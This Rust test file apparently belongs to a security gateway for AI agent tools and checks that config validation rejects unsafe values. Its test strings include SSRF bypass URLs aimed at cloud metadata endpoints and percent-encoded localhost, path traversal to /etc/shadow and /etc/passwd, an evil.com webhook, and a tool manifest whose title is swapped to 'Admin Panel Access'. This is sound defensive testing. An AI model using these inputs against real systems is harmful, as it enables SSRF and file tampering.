        limits: LimitsConfig::default(),
        compliance: ComplianceConfig::default(),
        extension: ExtensionConfig::default(),
        transport: TransportConfig::default(),
        gateway: GatewayConfig::default(),
        abac: AbacConfig::default(),
        fips: Default::default(),
        governance: Default::default(),
        deployment: Default::default(),
        streamable_http: Default::default(),
        discovery: Default::default(),
        projector: Default::default(),
        zk_audit: Default::default(),
        licensing: Default::default(),
        billing: Default::default(),
        audit_store: Default::default(),
        policy_lifecycle: Default::default(),
        metering: Default::default(),
        iam: Default::default(),
        topology: Default::default(),
        shield: Default::default(),
        acis: Default::default(),
        tool_quotas: Default::default(),
        secret_substitutions: Default::default(),
        policy_templates: Default::default(),
        source_trust: Default::default(),
        sink_classification: Default::default(),
        intent_scope: Default::default(),
    };
    config.policies = (0..=MAX_POLICIES)
        .map(|i| PolicyRule {
            name: format!("p{i}"),
            tool_pattern: "*".to_string(),
            function_pattern: "*".to_string(),
            policy_type: PolicyType::Allow,
            priority: Some(100),
            id: None,
            path_rules: None,
            network_rules: None,
        })
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("policies"));
    assert!(err.contains(&MAX_POLICIES.to_string()));
}

#[test]
fn test_validate_rejects_hybrid_kex_policy_when_tls_disabled() {
    let mut config = minimal_config();
    config.tls.kex_policy = TlsKexPolicy::HybridPreferred;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.kex_policy requires tls.mode"),
        "expected tls mode validation error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_hybrid_kex_policy_without_tls13() {
    let mut config = minimal_config();
    config.tls.mode = TlsMode::Tls;
    config.tls.cert_path = Some("/tmp/server.crt".to_string());
    config.tls.key_path = Some("/tmp/server.key".to_string());
    config.tls.min_version = "1.2".to_string();
    config.tls.kex_policy = TlsKexPolicy::HybridRequiredWhenSupported;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("requires tls.min_version = \"1.3\""),
        "expected tls13 requirement error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_hybrid_kex_policy_with_tls13() {
    let mut config = minimal_config();
    config.tls.mode = TlsMode::Tls;
    config.tls.cert_path = Some("/tmp/server.crt".to_string());
    config.tls.key_path = Some("/tmp/server.key".to_string());
    config.tls.min_version = "1.3".to_string();
    config.tls.kex_policy = TlsKexPolicy::HybridPreferred;
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_invalid_min_tls_version() {
    let mut config = minimal_config();
    config.tls.min_version = "1.1".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.min_version must be"),
        "expected min tls version validation error, got: {err}"
    );
}

#[test]
fn test_load_file_validates_bounds() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("bad.json");
    // Create a config with way too many PII patterns
    let patterns: Vec<serde_json::Value> = (0..=MAX_CUSTOM_PII_PATTERNS)
        .map(|i| {
            serde_json::json!({
                "name": format!("p{}", i),
                "pattern": format!("x{}", i)
            })
        })
        .collect();
    let json = serde_json::json!({
        "policies": [{"name": "t", "tool_pattern": "*", "function_pattern": "*", "policy_type": "Allow"}],
        "audit": {"custom_pii_patterns": patterns}
    });
    std::fs::write(&path, serde_json::to_string(&json).unwrap()).unwrap();

    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
    let err = result.unwrap_err().to_string();
    assert!(err.contains("custom_pii_patterns"));
}

#[test]
fn test_validate_at_limit_passes() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    // Exactly at the limit should pass
    config.audit.custom_pii_patterns = (0..MAX_CUSTOM_PII_PATTERNS)
        .map(|i| CustomPiiPattern {
            name: format!("pat_{i}"),
            pattern: format!("pattern{i}"),
        })
        .collect();
    assert!(config.validate().is_ok());
}

fn minimal_config() -> PolicyConfig {
    PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap()
}

#[test]
fn test_validate_rejects_nan_trust_threshold() {
    let mut config = minimal_config();
    config.tool_registry.trust_threshold = f32::NAN;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trust_threshold must be in [0.0, 1.0]"),
        "NaN should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_infinity_trust_threshold() {
    let mut config = minimal_config();
    config.tool_registry.trust_threshold = f32::INFINITY;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trust_threshold must be in [0.0, 1.0]"),
        "Infinity should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_out_of_range_trust_threshold() {
    let mut config = minimal_config();
    config.tool_registry.trust_threshold = 1.5;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("[0.0, 1.0]"),
        "1.5 should be out of range, got: {err}"
    );
}

#[test]
fn test_validate_rejects_http_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("http://evil.com/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("HTTPS"),
        "HTTP scheme should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_localhost_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://localhost/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Localhost should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_loopback_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://127.0.0.1/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Loopback should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_accepts_valid_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://siem.example.com/ingest".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_opa_endpoint_without_http_scheme() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("opa:8181".to_string());
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("opa.endpoint must start with http:// or https://"),
        "got: {err}"
    );
}

#[test]
fn test_validate_rejects_opa_http_endpoint_when_require_https() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://opa.internal:8181/v1/data/vellaveto/allow".to_string());
    config.opa.require_https = true;
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("opa.require_https=true requires opa.endpoint to use https://"),
        "got: {err}"
    );
}

#[test]
fn test_validate_accepts_opa_https_endpoint_when_require_https() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("https://opa.internal/v1/data/vellaveto/allow".to_string());
    config.opa.require_https = true;
    config.opa.bundle_path = None;

    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_accepts_opa_http_endpoint_when_require_https_disabled() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://127.0.0.1:8181/v1/data/vellaveto/allow".to_string());
    config.opa.require_https = false;
    config.opa.bundle_path = None;

    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_opa_endpoint_with_userinfo() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint =
        Some("https://user:pass@opa.internal/v1/data/vellaveto/allow".to_string());
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("must not include URL userinfo credentials"),
        "got: {err}"
    );
}

#[test]
fn test_validate_rejects_opa_endpoint_without_host() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("https://:443/v1/data/vellaveto/allow".to_string());
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(err.contains("must be a valid URL"), "got: {err}");
}

// SECURITY (R245-CFG-1): OPA endpoint must not target cloud metadata
#[test]
fn test_validate_rejects_opa_endpoint_cloud_metadata_ipv4() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://169.254.169.254/latest/meta-data/".to_string());
    config.opa.require_https = false;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("metadata") || err.contains("link-local"),
        "Should reject cloud metadata IP, got: {err}"
    );
}

#[test]
fn test_validate_rejects_opa_endpoint_cloud_metadata_gcp() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://metadata.google.internal/computeMetadata/".to_string());
    config.opa.require_https = false;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("metadata"),
        "Should reject GCP metadata hostname, got: {err}"
    );
}

#[test]
fn test_validate_accepts_opa_endpoint_localhost() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;

    // localhost is valid for OPA sidecar deployment
    assert!(
        config.validate().is_ok(),
        "localhost should be allowed for OPA sidecar"
    );
}

// SECURITY (R43-OPA-1): fail_open requires explicit acknowledgment
#[test]
fn test_validate_rejects_opa_fail_open_without_acknowledgment() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;
    config.opa.fail_open = true;
    config.opa.fail_open_acknowledged = false;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("fail_open_acknowledged"),
        "fail_open=true without acknowledgment should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_accepts_opa_fail_open_with_acknowledgment() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;
    config.opa.fail_open = true;
    config.opa.fail_open_acknowledged = true;

    assert!(
        config.validate().is_ok(),
        "fail_open=true with acknowledgment should be accepted"
    );
}

#[test]
fn test_validate_accepts_opa_fail_closed_without_acknowledgment() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;
    config.opa.fail_open = false;
    config.opa.fail_open_acknowledged = false;

    assert!(
        config.validate().is_ok(),
        "fail_open=false should not require acknowledgment"
    );
}

#[test]
fn test_validate_rejects_webhook_url_userinfo_bypass() {
    // R25-SUP-2: "https://evil.com@localhost/path" has actual host=localhost
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://evil.com@localhost/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Webhook URL with @localhost should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_webhook_url_userinfo_127() {
    // R25-SUP-2: "https://user:pass@127.0.0.1/path"
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://user:pass@127.0.0.1/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Webhook URL with @127.0.0.1 should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_persistence_path_traversal() {
    // R25-SUP-7: persistence_path must not contain ".."
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "../../../etc/shadow".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains(".."),
        "Persistence path with traversal should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_accepts_valid_persistence_path() {
    let mut config = minimal_config();
    // R41-SUP-7: Only relative paths are accepted now
    config.tool_registry.persistence_path = "data/registry.jsonl".to_string();
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_webhook_ipv6_loopback() {
    // R26-SUP-4: IPv6 loopback [::1] must be rejected
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[::1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback"),
        "Webhook URL with [::1] should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_webhook_ipv6_malformed() {
    // R26-SUP-4: Malformed IPv6 (missing closing bracket) must be rejected
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[::1:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("malformed IPv6"),
        "Webhook URL with malformed IPv6 should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_persistence_path_traversal_via_components() {
    // R26-SUP-1: Traversal via redundant components "foo/./bar/../../../etc"
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "registry/./data/../../../etc/passwd".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains(".."),
        "Persistence path with redundant-component traversal should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_excessive_batch_size() {
    let mut config = minimal_config();
    config.audit_export.batch_size = 100_000;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("batch_size"),
        "Excessive batch_size should be rejected, got: {err}"
    );
}

// SECURITY (FIND-R46-015): batch_size=0 should be rejected.
#[test]
fn test_validate_rejects_zero_batch_size() {
    let mut config = minimal_config();
    config.audit_export.batch_size = 0;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("batch_size") && err.contains("> 0"),
        "Zero batch_size should be rejected, got: {err}"
    );
}

// SECURITY (FIND-R46-011): disabled_patterns per-string length limit.
#[test]
fn test_validate_rejects_oversized_disabled_pattern() {
    let mut config = minimal_config();
    config.injection.disabled_patterns = vec!["x".repeat(2000)];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("disabled_patterns") && err.contains("max length"),
        "Oversized disabled_pattern should be rejected, got: {err}"
    );
}

// SECURITY (FIND-R46-012): empty extra_patterns rejection.
#[test]
fn test_validate_rejects_empty_extra_pattern() {
    let mut config = minimal_config();
    config.injection.extra_patterns = vec!["".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("extra_patterns") && err.contains("empty"),
        "Empty extra_pattern should be rejected, got: {err}"
    );
}

#[test]
fn test_manifest_title_hash_populated_from_tools_list() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [
                {
                    "name": "search",
                    "title": "Web Search",
                    "description": "Search the web",
                    "inputSchema": {"type": "object"}
                },
                {
                    "name": "no_title",
                    "description": "No title field",
                    "inputSchema": {"type": "object"}
                }
            ]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    let search = manifest.tools.iter().find(|t| t.name == "search").unwrap();
    assert!(search.title_hash.is_some(), "search should have title_hash");

    let no_title = manifest
        .tools
        .iter()
        .find(|t| t.name == "no_title")
        .unwrap();
    assert!(no_title.title_hash.is_none(), "no_title should have None");
}

#[test]
fn test_manifest_title_change_detected_as_drift() {
    // Pin with title "Search"
    let initial = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "search",
                "title": "Web Search",
                "description": "Search the web",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let pinned = ToolManifest::from_tools_list(&initial).unwrap();

    // Same tool with changed title
    let changed = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 2,
        "result": {
            "tools": [{
                "name": "search",
                "title": "Admin Panel Access",
                "description": "Search the web",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let result = pinned.verify(&changed);
    assert!(!result.passed, "Should detect title change as discrepancy");
    assert!(
        result
            .discrepancies
            .iter()
            .any(|d| d.contains("title changed")),
        "Discrepancy should mention title: {:?}",
        result.discrepancies
    );
}

#[test]
fn test_manifest_same_title_passes() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "search",
                "title": "Web Search",
                "description": "Search the web",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    let result = pinned.verify(&response);
    assert!(result.passed, "Identical tools/list should pass");
}

#[test]
fn test_max_path_decode_iterations_toml_roundtrip() {
    // With custom value
    let toml = r#"
max_path_decode_iterations = 5

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.max_path_decode_iterations, Some(5));

    // Without value (default is None)
    let toml_no_limit = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config2 = PolicyConfig::from_toml(toml_no_limit).unwrap();
    assert_eq!(config2.max_path_decode_iterations, None);
}

#[test]
fn test_max_path_decode_iterations_json_roundtrip() {
    let json = r#"{"policies":[{"name":"test","tool_pattern":"*","function_pattern":"*","policy_type":"Allow"}],"max_path_decode_iterations":10}"#;
    let config = PolicyConfig::from_json(json).unwrap();
    assert_eq!(config.max_path_decode_iterations, Some(10));
}

// R261-CFG-3: max_path_decode_iterations must be bounded
#[test]
fn test_validate_rejects_max_path_decode_iterations_exceeds_1000() {
    let mut config = minimal_config();
    config.max_path_decode_iterations = Some(1001);
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max_path_decode_iterations"),
        "Should reject >1000: {err}"
    );
}

#[test]
fn test_validate_accepts_max_path_decode_iterations_at_1000() {
    let mut config = minimal_config();
    config.max_path_decode_iterations = Some(1000);
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_accepts_max_path_decode_iterations_none() {
    let mut config = minimal_config();
    config.max_path_decode_iterations = None;
    assert!(config.validate().is_ok());
}

// R32-SSRF-1: IPv4-mapped IPv6 webhook URL must be rejected
#[test]
fn test_validate_rejects_webhook_ipv4_mapped_ipv6() {
    let mut config = minimal_config();
    // ::ffff:169.254.169.254 is the cloud metadata endpoint as IPv4-mapped IPv6
    config.audit_export.webhook_url =
        Some("https://[::ffff:169.254.169.254]/latest/meta-data".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv4-mapped IPv6 cloud metadata address should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_webhook_ipv4_mapped_ipv6_rfc1918() {
    let mut config = minimal_config();
    // ::ffff:10.0.0.1 is a private RFC 1918 address as IPv4-mapped IPv6
    config.audit_export.webhook_url = Some("https://[::ffff:10.0.0.1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv4-mapped IPv6 RFC 1918 address should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_webhook_ipv6_link_local_non_zero_bits() {
    // R33-SUP-3: fe80::/10 covers fe80:: through febf::ffff.
    // Previously only fe80::X was blocked; fea0::1 should also be rejected.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fea0::1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 link-local fea0::1 should be rejected, got: {err}"
    );
}

#[test]
fn test_validate_rejects_webhook_ipv6_link_local_febf() {
    // R33-SUP-3: febf:: is the last address in fe80::/10 range
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[febf::1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 link-local febf::1 should be rejected, got: {err}"
    );
}

// --- R40-SUP-2: IPv6 zone identifier bypass tests ---

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_zone_id_link_local() {
    // fe80::1%eth0 is link-local; the zone ID must be stripped so the
    // address parses correctly and hits the private IP rejection.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fe80::1%eth0]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 zone-id link-local fe80::1%eth0 should be rejected, got: {err}"
    );
}

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_zone_id_loopback() {
    // ::1%lo is loopback; the zone ID must be stripped before parsing.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[::1%lo]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost")
            || err.contains("loopback")
            || err.contains("private")
            || err.contains("internal"),
        "IPv6 zone-id loopback ::1%lo should be rejected, got: {err}"
    );
}

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_percent_encoded_zone_id() {
    // 2001:db8::1%25eth0 uses percent-encoded zone ID (%25 = '%').
    // 2001:db8::/32 is documentation prefix, should be rejected if
    // the address parses at all (it doesn't match any private range
    // in the current checks, but let's verify zone stripping works
    // by testing with a known-private address).
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fe80::1%25eth0]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 percent-encoded zone-id fe80::1%%25eth0 should be rejected, got: {err}"
    );
}

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_zone_id_ula() {
    // fc00::1%eth0 is ULA (Unique Local Address); zone ID stripped, rejected.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fc00::1%eth0]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 zone-id ULA fc00::1%eth0 should be rejected, got: {err}"
    );
}

#[test]
fn test_r39_sup_2_verify_binary_uses_constant_time_comparison() {
    // Verify that verify_binary still works correctly with constant-time eq
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("test-binary");
    std::fs::write(&bin_path, b"test binary content").unwrap();

    let actual_hash = SupplyChainConfig::compute_hash(&bin_path.to_string_lossy()).unwrap();

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(bin_path.to_string_lossy().to_string(), actual_hash);

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    assert!(config.verify_binary(&bin_path.to_string_lossy()).is_ok());
}

// --- R39-SUP-3: compute_hash file size bound tests ---

#[test]
fn test_r39_sup_3_compute_hash_works_for_normal_files() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("small-binary");
    std::fs::write(&path, b"small file content").unwrap();

    let result = SupplyChainConfig::compute_hash(&path.to_string_lossy());
    assert!(result.is_ok());
    // SHA-256 hex hash should be 64 chars
    assert_eq!(result.unwrap().len(), 64);
}

#[test]
fn test_r39_sup_3_compute_hash_nonexistent_file_returns_error() {
    let result = SupplyChainConfig::compute_hash("/nonexistent/path/binary");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Cannot read metadata"));
}

// --- R39-SUP-4: supply_chain.allowed_servers bound tests ---

#[test]
fn test_r39_sup_4_validate_rejects_too_many_allowed_servers() {
    let mut config = minimal_config();
    for i in 0..=MAX_ALLOWED_SERVERS {
        config
            .supply_chain
            .allowed_servers
            .insert(format!("/usr/local/bin/server-{i}"), format!("{i:064x}"));
    }
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("supply_chain.allowed_servers"),
        "Expected supply_chain.allowed_servers error, got: {err}"
    );
    assert!(
        err.contains(&format!("{MAX_ALLOWED_SERVERS}")),
        "Error should mention the max limit, got: {err}"
    );
}

#[test]
fn test_r39_sup_4_validate_accepts_allowed_servers_at_limit() {
    let mut config = minimal_config();
    for i in 0..MAX_ALLOWED_SERVERS {
        config
            .supply_chain
            .allowed_servers
            .insert(format!("/usr/local/bin/server-{i}"), format!("{i:064x}"));
    }
    // Exactly at the limit should pass
    assert!(config.validate().is_ok());
}

// --- R41-SUP-3: Percent-encoded IPv6 bracket SSRF tests ---

#[test]
fn test_r41_sup_3_webhook_rejects_percent_encoded_ipv6_link_local() {
    // R41-SUP-3: %5B and %5D encode '[' and ']'; fe80::1 is link-local
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://%5Bfe80::1%5D/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal") || err.contains("IPv6"),
        "Percent-encoded IPv6 link-local should be rejected, got: {err}"
    );
}

#[test]
fn test_r41_sup_3_webhook_rejects_percent_encoded_ipv6_loopback() {
    // R41-SUP-3: %5B::1%5D is [::1] (loopback)
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://%5B::1%5D:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback") || err.contains("private"),
        "Percent-encoded IPv6 loopback should be rejected, got: {err}"
    );
}

#[test]
fn test_r41_sup_3_webhook_rejects_lowercase_percent_encoded_brackets() {
    // R41-SUP-3: lowercase %5b/%5d should also be decoded
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://%5bfe80::1%5d/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal") || err.contains("IPv6"),
        "Lowercase percent-encoded IPv6 link-local should be rejected, got: {err}"
    );
}

// --- R42-CFG-1: Percent-encoded localhost SSRF bypass tests ---

#[test]
fn test_r42_cfg_1_webhook_rejects_percent_encoded_localhost() {
    // R42-CFG-1: %6c%6f%63%61%6c%68%6f%73%74 = "localhost"
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%6c%6f%63%61%6c%68%6f%73%74/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback"),
        "Percent-encoded 'localhost' should be rejected, got: {err}"
    );
}

#[test]
fn test_r42_cfg_1_webhook_rejects_percent_encoded_127_0_0_1() {
    // R42-CFG-1: %31%32%37%2e%30%2e%30%2e%31 = "127.0.0.1"
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%31%32%37%2e%30%2e%30%2e%31/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback") || err.contains("private"),
        "Percent-encoded '127.0.0.1' should be rejected, got: {err}"
    );
}

#[test]
fn test_r42_cfg_1_webhook_rejects_mixed_case_percent_encoded_localhost() {
    // R42-CFG-1: Mixed-case percent encoding (%6C vs %6c)
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%4C%4F%43%41%4C%48%4F%53%54/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback"),
        "Mixed-case percent-encoded 'LOCALHOST' should be rejected, got: {err}"
    );
}

#[test]
fn test_r42_cfg_1_webhook_rejects_percent_encoded_private_ip() {
    // R42-CFG-1: %31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34 = "169.254.169.254"
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "Percent-encoded cloud metadata IP should be rejected, got: {err}"
    );
}

// --- R41-SUP-7: Absolute persistence_path rejection tests ---

#[test]
fn test_r41_sup_7_persistence_path_rejects_absolute_etc_passwd() {
    // R41-SUP-7: Absolute paths allow writing to arbitrary system locations
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "/etc/passwd".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("relative path"),
        "Absolute path /etc/passwd should be rejected, got: {err}"
    );
}

#[test]
fn test_r41_sup_7_persistence_path_rejects_absolute_tmp() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "/tmp/file".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("relative path"),
        "Absolute path /tmp/file should be rejected, got: {err}"
    );
}

#[test]
fn test_r41_sup_7_persistence_path_rejects_absolute_cron() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "/etc/cron.d/backdoor".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("relative path"),
        "Absolute path /etc/cron.d/backdoor should be rejected, got: {err}"
    );
}

#[test]
fn test_r41_sup_7_persistence_path_accepts_relative_path() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "registry/data.jsonl".to_string();
    assert!(config.validate().is_ok());
}

// ── Behavioral detection config tests ────────────────────────

#[test]
fn test_behavioral_config_defaults() {
    let config = BehavioralDetectionConfig::default();
    assert!(!config.enabled);
    assert!((config.alpha - 0.2).abs() < f64::EPSILON);
    assert!((config.threshold - 10.0).abs() < f64::EPSILON);
    assert_eq!(config.min_sessions, 3);
    assert_eq!(config.max_tools_per_agent, 500);
    assert_eq!(config.max_agents, 10_000);
}

#[test]
fn test_behavioral_config_from_toml() {
    let toml = r#"
[behavioral]
enabled = true
alpha = 0.3
threshold = 5.0
min_sessions = 5
max_tools_per_agent = 200
max_agents = 5000

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.behavioral.enabled);
    assert!((config.behavioral.alpha - 0.3).abs() < f64::EPSILON);
    assert!((config.behavioral.threshold - 5.0).abs() < f64::EPSILON);
    assert_eq!(config.behavioral.min_sessions, 5);
    assert_eq!(config.behavioral.max_tools_per_agent, 200);
    assert_eq!(config.behavioral.max_agents, 5000);
}

#[test]
fn test_behavioral_config_absent_uses_defaults() {
    let config = minimal_config();
    assert!(!config.behavioral.enabled);
    assert!((config.behavioral.alpha - 0.2).abs() < f64::EPSILON);
}

#[test]
fn test_validate_rejects_behavioral_alpha_zero() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = 0.0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {err}");
}

#[test]
fn test_validate_rejects_behavioral_alpha_negative() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = -0.1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {err}");
}

#[test]
fn test_validate_rejects_behavioral_alpha_above_one() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = 1.01;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {err}");
}

#[test]
